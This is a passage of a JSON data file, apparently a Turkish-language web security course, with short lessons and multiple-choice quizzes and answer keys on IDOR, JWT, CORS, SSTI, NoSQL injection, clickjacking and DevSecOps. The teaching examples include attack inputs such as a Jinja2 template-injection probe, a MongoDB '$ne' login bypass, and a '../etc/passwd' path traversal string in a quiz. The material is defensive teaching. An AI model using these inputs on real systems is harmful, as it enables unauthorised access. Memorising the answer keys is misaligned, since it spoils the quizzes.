      "content": "<h2>Broken Authentication (Kimlik Doğrulama Hataları)</h2><p>Kimlik doğrulama mekanizmalarındaki yapılandırma hataları ve zayıflıklar, saldırganların kullanıcı hesaplarını ele geçirmesine (Account Takeover) olanak tanır.</p><p>Sık Karşılaşılan Hatalar:</p><ul><li>Kaba kuvvet (Brute-force) ve kimlik bilgisi doldurma (Credential Stuffing) saldırılarına karşı koruma (Rate Limiting) olmaması.</li><li>Çok zayıf şifre politikaları (örn: 123456 şifresine izin verilmesi).</li><li>Oturum kimliklerinin (Session ID) güvenli olmayan şekilde yönetilmesi, URL'lerde taşınması veya oturum kapatıldığında sunucuda geçersiz kılınmaması.</li></ul>",
      "example": "<h3>Saldırı Yöntemi:</h3><p>Bir web sitesinin giriş panelinde Rate Limit (istek sınırlaması) yoksa, saldırgan Burp Suite Intruder ile dakikada binlerce şifre deneyerek kullanıcı hesaplarını kolayca ele geçirebilir.</p>",
      "questions": [
        {
          "q": "Aşağıdakilerden hangisi Broken Authentication (Kimlik Doğrulama Hataları) kapsamına girer?",
          "options": [
            "SQL enjeksiyonu açığı",
            "Giriş panelinde kaba kuvvet (brute-force) korumasının olmaması",
            "XSS açığı",
            "CSS dosyalarının yüklenememesi"
          ],
          "correct": 1
        },
        {
          "q": "Giriş denemelerini sınırlandırmak ve kaba kuvvet saldırılarını engellemek için kullanılan teknoloji hangisidir?",
          "options": [
            "Encryption",
            "Rate Limiting (İstek Sınırlandırma)",
            "Hashing",
            "Obfuscation"
          ],
          "correct": 1
        },
        {
          "q": "Kullanıcının çıkış yaptıktan sonra session token'ının sunucuda silinmemesi ne tür bir riske yol açar?",
          "options": [
            "Web sunucusunun yavaşlamasına",
            "Saldırganın eski token'ı ele geçirerek kurbanın hesabına tekrar erişebilmesine (Session Hijacking)",
            "IP adresinin değişmesine",
            "Şifrenin silinmesine"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-19",
      "title": "BOLA / IDOR Zafiyeti",
      "content": "<h2>BOLA / IDOR Zafiyeti</h2><p><strong>BOLA (Broken Object Level Authorization)</strong> veya diğer adıyla <strong>IDOR (Insecure Direct Object Reference)</strong>, uygulamanın kullanıcıdan aldığı bir nesne tanımlayıcıyı (ID, dosya adı vb.) arka planda yetki kontrolü yapmadan doğrudan veritabanı sorgusuna veya dosya sistemine göndermesi sonucu oluşur.</p><p>Kullanıcı, istekteki kendi ID bilgisini başka bir kullanıcının ID bilgisiyle değiştirerek yetkisiz verilere erişebilir veya bunları değiştirebilir.</p>",
      "example": "<h3>İstek Analizi:</h3><p>Fatura görüntüleme linki: <code>https://site.com/invoice?id=1005</code><br/>Saldırgan parametreyi değiştirir: <code>https://site.com/invoice?id=1006</code><br/>Eğer uygulama kullanıcının 1006 nolu faturayı görmeye yetkili olup olmadığını kontrol etmiyorsa BOLA/IDOR zafiyeti vardır.</p>",
      "questions": [
        {
          "q": "BOLA/IDOR zafiyetinin temel ortaya çıkış nedeni nedir?",
          "options": [
            "Veritabanı şifresinin çalınması",
            "Kullanıcıdan gelen nesne referansı (ID vb.) isteklerinde sunucu tarafında yetki/sahiplik kontrolü yapılmaması",
            "Tarayıcının çökmesi",
            "SSL sertifikasının olmaması"
          ],
          "correct": 1
        },
        {
          "q": "Bir e-ticaret sitesinde sipariş detayı linkindeki '?order_id=55' değerini '?order_id=56' yaparak başkasının siparişini görmek hangi zafiyete örnektir?",
          "options": [
            "XSS",
            "SQLi",
            "IDOR / BOLA",
            "CSRF"
          ],
          "correct": 2
        },
        {
          "q": "IDOR zafiyetlerini engellemek için ne yapılmalıdır?",
          "options": [
            "ID değerlerini tamamen gizlemek",
            "Her nesne erişim isteğinde, oturum açmış kullanıcının o nesneye (objeye) erişim izni olup olmadığını sunucu tarafında doğrulamak",
            "Sadece POST istekleri kullanmak",
            "Bütün ID'leri silmek"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-20",
      "title": "Broken Function Level Authorization (BFLA)",
      "content": "<h2>Broken Function Level Authorization (BFLA)</h2><p>BFLA, uygulamanın hassas işlevleri ve fonksiyonları (örn: admin paneline erişim, kullanıcı silme, ayarlara erişim) sadece istemci tarafında (gizleyerek veya menüyü göstermeyerek) koruması, ancak sunucu tarafında yetki denetimi yapmaması durumudur.</p><p>Saldırgan, admin panelinin URL'ini (örn: `/admin/deleteUser`) tahmin ederek veya API uç noktasını doğrudan çağırarak normal kullanıcı hesabı ile admin yetkisine sahip fonksiyonları çalıştırabilir.</p>",
      "example": "<h3>Saldırı Örneği:</h3><p>Normal kullanıcı: <code>https://site.com/profile</code> sayfasında işlem yapıyor.<br/>Saldırgan tarayıcıdan doğrudan admin API ucunu çağırır: <code>POST /api/v1/admin/users/1/delete</code>. Sunucu kullanıcının rolünü (admin olup olmadığını) kontrol etmeden isteği işlerse BFLA sömürülmüş olur.</p>",
      "questions": [
        {
          "q": "BFLA (Broken Function Level Authorization) zafiyetinin IDOR'dan en temel farkı nedir?",
          "options": [
            "Veritabanını kilitlemesi",
            "BOLA nesne (veri) bazında yetki hatasıyken, BFLA fonksiyonel (admin paneli işlemleri, API uç noktaları vb.) yetki hatasıdır",
            "Sadece mobil uygulamalarda görülmesi",
            "Şifre kırma saldırısı olması"
          ],
          "correct": 1
        },
        {
          "q": "Admin menüsünün normal kullanıcılara gösterilmeyip gizlenmesi, BFLA zafiyetini engellemek için yeterli bir güvenlik önlemi midir?",
          "options": [
            "Evet, kullanıcı görmediği için erişemez",
            "Hayır, saldırgan API uç noktalarını veya URL'leri tahmin edip doğrudan çağırabilir. Doğrulama mutlaka sunucu tarafında yapılmalıdır",
            "Sadece HTTPS aktifse yeterlidir",
            "Sadece şifreler karmaşıksa yeterlidir"
          ],
          "correct": 1
        },
        {
          "q": "Sunucu tarafında BFLA'yı önlemek için hangi güvenlik kontrolü mekanizması uygulanmalıdır?",
          "options": [
            "IP kısıtlaması",
            "Rol Tabanlı Erişim Kontrolü (RBAC - Role-Based Access Control)",
            "Sadece JavaScript şifrelemesi",
            "Dosya boyutu sınırı"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-21",
      "title": "Hassas Veri İfşası (Sensitive Data Exposure)",
      "content": "<h2>Hassas Veri İfşası (Sensitive Data Exposure)</h2><p>Hassas Veri İfşası, uygulamanın kritik bilgileri (şifreler, kredi kartları, kişisel sağlık verileri, API anahtarları) şifrelemeden açık metin (cleartext) olarak saklaması, ağda şifresiz iletmesi veya hata mesajlarında sızdırması durumudur.</p><p>Güvenlik Açığı Durumları:</p><ul><li>Veritabanındaki kullanıcı şifrelerinin hashlenmeden (açık metin) tutulması.</li><li>HTTPS yerine şifresiz HTTP kullanılarak kredi kartı bilgilerinin ağ üzerinden gönderilmesi.</li><li>Zayıf kriptografik algoritmaların (MD5, SHA1) kullanılması.</li></ul>",
      "example": "<h3>Kriptografik Hata:</h3><p>Bir e-ticaret veritabanı sızdırıldığında şifrelerin MD5 ile hashlenmiş olması, saldırganların gökkuşağı tabloları (Rainbow Tables) kullanarak şifreleri saniyeler içinde kırmasına yol açar. Şifreler tuzlanmış (salted) güçlü algoritmalarla (bcrypt, Argon2) hashlenmelidir.</p>",
      "questions": [
        {
          "q": "Aşağıdakilerden hangisi Hassas Veri İfşası zafiyetine bir örnektir?",
          "options": [
            "SQL enjeksiyonu açığı",
            "Kullanıcı şifrelerinin veritabanında açık metin (cleartext) olarak saklanması",
            "XSS açığı",
            "Çok faktörlü kimlik doğrulama kullanılması"
          ],
          "correct": 1
        },
        {
          "q": "Veritabanındaki kullanıcı şifrelerini güvenli bir şekilde saklamak için aşağıdaki yöntemlerden hangisi tercih edilmelidir?",
          "options": [
            "MD5 şifreleme",
            "Bcrypt veya Argon2 gibi güçlü ve tuzlanmış (salted) özetleme (hashing) algoritmaları",
            "AES asimetrik şifreleme",
            "Base64 kodlama"
          ],
          "correct": 1
        },
        {
          "q": "Ağ üzerinden hassas verilerin taşınması sırasında ifşayı önlemek için hangi protokolün kullanılması zorunludur?",
          "options": [
            "HTTP",
            "HTTPS / TLS",
            "Telnet",
            "FTP"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-22",
      "title": "Güvenlik Yapılandırma Hataları",
      "content": "<h2>Security Misconfiguration (Güvenlik Yapılandırma Hataları)</h2><p>Güvenlik Yapılandırma Hataları, sunucu, uygulama, veritabanı veya framework ayarlarının varsayılan (default) değerlerde bırakılması veya güvensiz yapılandırılması sonucu ortaya çıkar.</p><p>Tipik Yapılandırma Hataları:</p><ul><li>Giriş panellerinde varsayılan kullanıcı adı/şifrelerin (admin/admin, root/root) bırakılması.</li><li>Detaylı hata mesajlarının (Stack Trace) son kullanıcıya gösterilmesi (saldırganlar sunucu dizinlerini ve framework versiyonlarını buradan öğrenir).</li><li>Kullanılmayan servislerin, portların veya örnek sayfaların sunucuda aktif bırakılması.</li></ul>",
      "example": "<h3>Örnek Risk:</h3><p>Bir Apache web sunucusunda <code>Directory Listing</code> (Dizin Listeleme) özelliğinin açık bırakılması, saldırganın `/uploads/` veya `/configs/` dizinindeki tüm dosyaları tarayıcıdan listeleyip indirmesine izin verir.</p>",
      "questions": [
        {
          "q": "Aşağıdakilerden hangisi bir Güvenlik Yapılandırma Hatası (Security Misconfiguration) örneğidir?",
          "options": [
            "Parametrik sorgu kullanmak",
            "Sunucuda varsayılan (default) yönetim şifrelerinin değiştirilmeden bırakılması",
            "Girdileri filtrelemek",
            "Anti-CSRF token kullanmak"
          ],
          "correct": 1
        },
        {
          "q": "Uygulamanın hata anında kullanıcıya detaylı hata kodlarını ve stack trace (hata izi) bilgilerini göstermesinin güvenlik açısından riski nedir?",
          "options": [
            "Sayfayı yavaşlatması",
            "Saldırgana sunucu dosya yolları, veritabanı yapısı ve kullanılan kütüphane versiyonları gibi kritik keşif bilgileri sağlaması",
            "Tasarımı bozması",
            "Oturumu kapatması"
          ],
          "correct": 1
        },
        {
          "q": "Web sunucusunda dizin içeriğinin listelenmesini (Directory Listing) engellemek için ne yapılmalıdır?",
          "options": [
            "Sunucu kapatılmalı",
            "Sunucu konfigürasyon dosyasından dizin listeleme özelliği (Indexes) kapatılmalı",
            "Tüm dosyalar şifrelenmeli",
            "Yeni portlar açılmalı"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-23",
      "title": "CORS Açıklıkları",
      "content": "<h2>Cross-Origin Resource Sharing (CORS) Açıklıkları</h2><p>Tarayıcılar varsayılan olarak **Same-Origin Policy (SOP - Aynı Köken Politikası)** uygular: Bir sitedeki JavaScript kodları, başka bir sitenin verilerini okuyamaz. CORS ise bu kısıtlamayı esneterek güvenli veri paylaşımını sağlayan HTTP başlıkları mekanizmasıdır.</p><p><strong>Güvenlik Açığı:</strong> Eğer sunucu CORS başlığında <code>Access-Control-Allow-Origin: *</code> (herkese izin ver) ve <code>Access-Control-Allow-Credentials: true</code> (çerezleri de kabul et) tanımlarsa, saldırganın sitesi kurbanın adına hedef uygulamadan veri okuyabilir.</p>",
      "example": "<h3>Saldırı Akışı:</h3><p>Kurban banka sitesinde oturum açmışken saldırganın sitesine girer. Saldırganın sitesindeki JS kodu, bankanın API'sine istek atar. Yanlış yapılandırılmış CORS nedeniyle banka verileri saldırganın JS koduna teslim eder.</p>",
      "questions": [
        {
          "q": "Tarayıcıların, farklı sitelerin birbirinin verisini okumasını engelleyen temel güvenlik politikası hangisidir?",
          "options": [
            "CORS",
            "Same-Origin Policy (SOP - Aynı Köken Politikası)",
            "CSRF",
            "XSS"
          ],
          "correct": 1
        },
        {
          "q": "CORS yapılandırmasında hangi başlık değerinin '*' (wildcard) olarak ayarlanması ve kimlik doğrulamaya izin verilmesi ciddi güvenlik riskidir?",
          "options": [
            "Access-Control-Allow-Methods",
            "Access-Control-Allow-Origin",
            "Access-Control-Max-Age",
            "Content-Type"
          ],
          "correct": 1
        },
        {
          "q": "CORS güvenlik açıklarından korunmak için sunucu tarafında ne yapılmalıdır?",
          "options": [
            "Tüm CORS istekleri engellenmeli",
            "Origin başlığı kontrol edilmeli ve sadece güvenilir, belirli alan adlarına izin listesi (whitelist) uygulanmalıdır",
            "Sadece HTTP kullanılmalı",
            "Çerezler tamamen silinmeli"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-24",
      "title": "JWT Güvenliği ve Manipülasyonu",
      "content": "<h2>JWT (JSON Web Token) Güvenliği</h2><p>JWT, istemci ve sunucu arasında güvenli veri transferi sağlayan, nokta işaretleriyle ayrılmış 3 parçalı (Header.Payload.Signature) bir token standardıdır.</p><p>Saldırganların uyguladığı manipülasyon yöntemleri:</p><ul><li><strong>None Algoritması Bypass:</strong> Token başlığındaki `alg` alanı `none` yapılır ve imza kısmı silinir. Kötü yazılmış sunucular imzayı doğrulamadan token'ı kabul edebilir.</li><li><strong>Zayıf Gizli Anahtar (Secret Key):</strong> İmzalama anahtarı zayıfsa (örn: `secret`), saldırganlar Hashcat gibi araçlarla anahtarı çevrimdışı kırıp kendi sahte admin token'larını imzalayabilir.</li></ul>",
      "example": "<h3>JWT Parçalama:</h3><p>Örnek Token: <code>eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYW5nIn0.signature</code><br/>İlk kısım Header (algoritma bilgisi), ikinci kısım Payload (kullanıcı bilgileri), üçüncü kısım ise doğrulama imzasıdır.</p>",
      "questions": [
        {
          "q": "JWT (JSON Web Token) yapısında nokta (.) karakteriyle ayrılmış 3 ana bölüm sırasıyla hangileridir?",
          "options": [
            "Signature, Payload, Header",
            "Header, Payload, Signature",
            "Payload, Header, Key",
            "User, Role, Hash"
          ],
          "correct": 1
        },
        {
          "q": "JWT manipülasyonunda 'None algoritması' saldırısı nasıl çalışır?",
          "options": [
            "Kullanıcı şifresini silerek",
            "Token başlığındaki algoritma türünü 'none' yapıp imza doğrulamayı devre dışı bırakmayı hedefleyerek",
            "Token boyutunu büyüterek",
            "Yeni port açarak"
          ],
          "correct": 1
        },
        {
          "q": "JWT'lerin güvenliğini sağlamak için imzalama aşamasında ne kullanılmalıdır?",
          "options": [
            "Zayıf tahmin edilebilir anahtarlar",
            "Karmaşık, uzun ve yüksek entropili güçlü gizli anahtarlar (Strong Secret Keys)",
            "Base64 şifreleme",
            "Hiçbir anahtar kullanılmamalıdır"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-25",
      "title": "Clickjacking Saldırısı ve Savunma",
      "content": "<h2>Clickjacking (Tık Tuzağı)</h2><p>Clickjacking, bir saldırganın kurbanı görünmez veya şeffaf bir çerçeveye (iframe) tıklamaya yönlendirerek, kullanıcının aslında başka bir sitede (örn. sosyal medya hesabı, banka ayarları) istem dışı bir işlem gerçekleştirmesini sağlayan arayüz manipülasyon saldırısıdır.</p><p>Saldırgan, hedef siteyi kendi hazırladığı web sayfasının içine <code>&lt;iframe&gt;</code> olarak gömer ve bu çerçevenin görünürlüğünü CSS ile `%0` yapar (tamamen şeffaf). Kurban kendi gördüğü düğmelere tıkladığını sanırken, arkadaki görünmez sitenin düğmelerine tıklar.</p>",
      "example": "<h3>Önleme Parametresi:</h3><p>Web sunucularında <strong>`X-Frame-Options: DENY`</strong> veya <strong>`SAMEORIGIN`</strong> başlığı kullanılarak sitenin başka siteler içinde iframe olarak gömülmesi engellenir.</p>",
      "questions": [
        {
          "q": "Kullanıcının şeffaf bir iframe üzerindeki görünmez öğelere tıklatılarak istem dışı işlemler yaptırıldığı saldırı türü hangisidir?",
          "options": [
            "CSRF",
            "XSS",
            "Clickjacking (Tık Tuzağı)",
            "BOLA"
          ],
          "correct": 2
        },
        {
          "q": "Web sitenizin başka siteler içinde iframe olarak gömülmesini (clickjacking saldırısını) engellemek için kullanılan HTTP yanıt başlığı hangisidir?",
          "options": [
            "X-XSS-Protection",
            "X-Frame-Options",
            "Content-Type",
            "Server"
          ],
          "correct": 1
        },
        {
          "q": "X-Frame-Options başlığındaki 'SAMEORIGIN' değeri neyi ifade eder?",
          "options": [
            "Sitenin hiçbir şekilde iframe içinde açılamayacağını",
            "Sitenin sadece kendi alan adı altındaki sayfalarda iframe içinde açılabileceğini",
            "Sitenin her yerde açılabileceğini",
            "Sitenin şifrelendiğini"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-26",
      "title": "SSTI (Server-Side Template Injection)",
      "content": "<h2>Server-Side Template Injection (SSTI)</h2><p>SSTI, web uygulamalarının dinamik içerik üretmek için şablon motorlarını (Template Engines - Jinja2, Twig, FreeMarker vb.) kullandığı durumlarda ortaya çıkan ciddi bir enjeksiyon açığıdır.</p><p>Uygulama, kullanıcı girdilerini şablon yapısıyla doğrudan birleştirip sunucuda işlerse, saldırgan şablon kodları enjekte edebilir. Bu durum şablon motorunun gücünü kullanarak sunucu üzerinde yerel dosya okuma ve doğrudan **RCE (Uzaktan Kod Çalıştırma)** elde etmeye yol açar.</p>",
      "example": "<h3>Jinja2 (Python) Testi:</h3><p>Arama parametresine <code>{{ 7 * 7 }}</code> yazıldığında, sunucu yanıt olarak <code>49</code> değerini dönerse SSTI zafiyeti doğrulanmış olur.</p>",
      "questions": [
        {
          "q": "Şablon motorlarının (Template Engines) gücünü suistimal ederek sunucuda uzaktan kod çalıştırılmasını (RCE) sağlayan enjeksiyon türü hangisidir?",
          "options": [
            "SQL Injection",
            "SSTI (Server-Side Template Injection)",
            "XHTML Injection",
            "LDAP Injection"
          ],
          "correct": 1
        },
        {
          "q": "Aşağıdaki payload'lardan hangisi Jinja2 veya Twig şablon motorlarında SSTI testi yapmak için sıkça kullanılır?",
          "options": [
            "' OR 1=1--",
            "<script>alert(1)</script>",
            "{{ 7 * 7 }}",
            "../etc/passwd"
          ],
          "correct": 2
        },
        {
          "q": "SSTI zafiyetini önlemek için ne yapılmalıdır?",
          "options": [
            "Tüm girdileri kaldırmak",
            "Kullanıcı verilerini asla şablon yapısıyla doğrudan birleştirmemek, şablon motorlarının güvenli parametrik bağlama özelliklerini kullanmak",
            "Sadece PHP kullanmak",
            "Sunucuyu kapatmak"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-27",
      "title": "NoSQL Injection",
      "content": "<h2>NoSQL Injection ve Mantıksal Operatör Enjeksiyonu</h2><p>NoSQL veritabanları (örn. MongoDB) geleneksel SQL dili yerine JSON tabanlı nesne sorguları kullanır. Ancak girdiler güvenli olmayan şekilde sorgu nesnesiyle birleştirilirse <strong>NoSQL Injection</strong> zafiyeti oluşur.</p><p>Saldırganlar, veritabanı filtrelerini aşmak için mantıksal operatörleri enjekte ederler. En sık kullanılan operatörler:</p><ul><li>`$ne`: Eşit değil (Not Equal)</li><li>`$gt`: Büyüktür (Greater Than)</li></ul>",
      "example": "<h3>Zafiyetli Express/MongoDB Giriş Paneli:</h3><pre><code>db.users.find({ username: req.body.username, password: req.body.password })</code></pre><p>Saldırgan şifre parametresini JSON nesnesi olarak gönderir: <code>{ \"$ne\": \"xyz\" }</code>. Bu durumda şifresi 'xyz' olmayan ilk kullanıcıyla giriş yapılır.</p>",
      "questions": [
        {
          "q": "NoSQL Injection saldırılarında, giriş panelini bypass etmek için sıklıkla enjekte edilen '$ne' operatörünün anlamı nedir?",
          "options": [
            "Eşittir (Equal)",
            "Eşit Değildir (Not Equal)",
            "Büyüktür (Greater Than)",
            "Küçüktür (Less Than)"
          ],
          "correct": 1
        },
        {
          "q": "Aşağıdaki veritabanı sistemlerinden hangisi NoSQL Injection saldırılarının doğrudan hedefi olabilir?",
          "options": [
            "MySQL",
            "PostgreSQL",
            "MongoDB",
            "MSSQL"
          ],
          "correct": 2
        },
        {
          "q": "NoSQL enjeksiyon açıklarını engellemek için kod yazarken ne yapılmalıdır?",
          "options": [
            "Sorgu stringlerini birleştirmek",
            "Kullanıcı girdilerini JSON nesneleri olarak doğrudan sorguya sokmak yerine, girdileri şema kurallarına göre katı tiplere dönüştürmek (casting) veya sanitize etmek",
            "SQL veritabanına geçmek",
            "Hiçbir filtre kullanmamak"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-28",
      "title": "API Güvenliği ve Hız Sınırlaması",
      "content": "<h2>API Güvenliği ve Hız Sınırlaması (Rate Limiting)</h2><p>Modern web ve mobil uygulamalar arka planda REST veya GraphQL API'leri ile haberleşir. API'ler doğrudan dışarıya açık oldukları için saldırganların birincil hedefidir.</p><p><strong>Hız Sınırlaması (Rate Limiting) Eksikliği:</strong> Bir API ucuna (örn: `/api/v1/auth/login` veya `/api/v1/sms/send`) dakikada sınırsız sayıda istek atılması durumudur. Saldırganlar bu sayede kolayca kaba kuvvet, brute-force veya SMS bombalama (spam) saldırısı yapabilir.</p>",
      "example": "<h3>Çözüm:</h3><p>API sunucularında IP veya kullanıcı token'ı başına bir hız sınırı (örn: 1 dakikada en fazla 60 istek) tanımlanarak otomatik istekler ve saldırı araçları engellenir.</p>",
      "questions": [
        {
          "q": "API uç noktalarında Rate Limiting (Hız Sınırlaması) olmamasının siber güvenlik açısından en büyük riski nedir?",
          "options": [
            "Sunucu IP adresinin değişmesi",
            "Saldırganların kaba kuvvet (brute-force) veya kaynak tüketim saldırılarını sınırsız istekle otomatikleştirebilmesi",
            "API'nin JSON dönmemesi",
            "SSL hatası çıkması"
          ],
          "correct": 1
        },
        {
          "q": "SMS gönderme API'sini suistimal eden bir saldırganın yaptığı SMS bombalama saldırısını engellemek için hangisi uygulanmalıdır?",
          "options": [
            "Şifreleme",
            "IP ve telefon numarası bazlı istek sıklığı sınırlaması (Rate Limit)",
            "Yeni bir SMS sunucusu almak",
            "SMS metnini uzatmak"
          ],
          "correct": 1
        },
        {
          "q": "API güvenliğinde kimlik doğrulama için genellikle HTTP başlığında (Header) ne taşınır?",
          "options": [
            "HTML kodu",
            "Bearer Token (örn. JWT)",
            "Kullanıcı adı ve şifre açık metin olarak",
            "MAC Adresi"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-29",
      "title": "Güvenli Kod Analizi (SAST/DAST)",
      "content": "<h2>Güvenli Kod Analizi (SAST ve DAST)</h2><p>Uygulamalar yayına alınmadan önce güvenlik açıklarının tespit edilmesi için iki temel test metodolojisi kullanılır:</p><p><strong>SAST (Static Application Security Testing - Statik Test):</strong> Uygulama çalıştırılmadan, kaynak kod düzeyinde analiz edilir (White-box). Kod satırlarındaki zafiyetli fonksiyonlar (örn. `system()`, parametresiz SQL sorguları) otomatik taranır.</p><p><strong>DAST (Dynamic Application Security Testing - Dinamik Test):</strong> Uygulama çalışır durumdayken, dışarıdan girdi enjekte edilerek test edilir (Black-box). Sunucu yanıtları analiz edilerek XSS, SQLi gibi açıklar aranır.</p>",
      "example": "<h3>Araçlar:</h3><p>SAST için SonarQube, DAST için ise OWASP ZAP veya Burp Suite Scanner gibi popüler güvenlik analiz araçları kullanılır.</p>",
      "questions": [
        {
          "q": "Uygulamanın kaynak kodlarını çalıştırmadan, statik olarak analiz ederek güvenlik açıklarını bulan test yöntemine ne ad verilir?",
          "options": [
            "DAST",
            "SAST",
            "Pentest",
            "Fuzzing"
          ],
          "correct": 1
        },
        {
          "q": "DAST (Dinamik Güvenlik Testi) yöntemi uygulamayı hangi bakış açısıyla test eder?",
          "options": [
            "Beyaz Kutu (White-box - kaynak kodu görerek)",
            "Kara Kutu (Black-box - uygulama çalışırken dışarıdan test ederek)",
            "Kod satırlarını tek tek inceleyerek",
            "Veritabanını doğrudan silerek"
          ],
          "correct": 1
        },
        {
          "q": "Aşağıdakilerden hangisi popüler bir DAST (Dinamik Güvenlik Testi) aracıdır?",
          "options": [
            "SonarQube",
            "OWASP ZAP",
            "ESLint",
            "Git"
          ],
          "correct": 1
        }
      ]
    },
    {
      "id": "uyg-30",
      "title": "DevSecOps ve Güvenli Yaşam Döngüsü",
      "content": "<h2>DevSecOps ve Güvenli Yazılım Yaşam Döngüsü</h2><p>Geleneksel yazılım süreçlerinde güvenlik, yazılım bittikten sonra en son aşamada (sızma testiyle) kontrol edilirdi. Bu durum hem maliyetli hem de geç kalınmış güvenlik açıklarına yol açardı.</p><p><strong>DevSecOps:</strong> Güvenliğin, yazılım geliştirme (Dev) ve operasyon (Ops) süreçlerinin en başından itibaren her aşamaya (kod yazımı, derleme, test, canlıya alma) otomatik olarak entegre edilmesidir (Shift-Left - Güvenliği Sola Çekmek).</p>",
      "example": "<h3>CI/CD Pipeline:</h3><p>DevSecOps uygulanan bir projede, geliştirici kodu GitHub'a gönderdiği anda, otomatik çalışan CI/CD araçları kodu güvenlik açıklarına (SAST), bağımlılık açıklarına (SCA) karşı tarar ve hata varsa yayını engeller.</p>",
      "questions": [
        {
          "q": "Yazılım geliştirme süreçlerinde güvenliğin en başından itibaren otomatik araçlarla her aşamaya entegre edilmesini savunan kültür ve yaklaşım hangisidir?",
          "options": [
            "DevOps",
            "DevSecOps",
            "Agile",
            "WaterFall"
          ],
          "correct": 1
        },
        {
          "q": "DevSecOps felsefesinde yer alan 'Shift-Left' (Güvenliği Sola Çekmek) kavramının anlamı nedir?",
          "options": [
            "Kodları sol tarafa yazmak",
            "Güvenlik kontrollerini yazılım yaşam döngüsünün en erken aşamalarına (tasarım ve kodlama) kaydırmak",
            "Sadece sol el kullanan geliştiricileri işe almak",
            "Güvenliği en son adıma bırakmak"
          ],
          "correct": 1
        },
        {
          "q": "Aşağıdakilerden hangisi bir DevSecOps boru hattında (pipeline) otomatik olarak yapılması gereken taramalardan biri değildir?",
          "options": [
            "Kaynak kod güvenliği taraması (SAST)",
            "Kullanılan kütüphanelerin güvenlik açığı taraması (SCA)",
            "Kullanıcıların kişisel bilgisayarlarının antivirüs taraması",
            "Konteyner (Docker) imaj taraması"
          ],
          "correct": 2
        }
      ]
    }
  ]
};
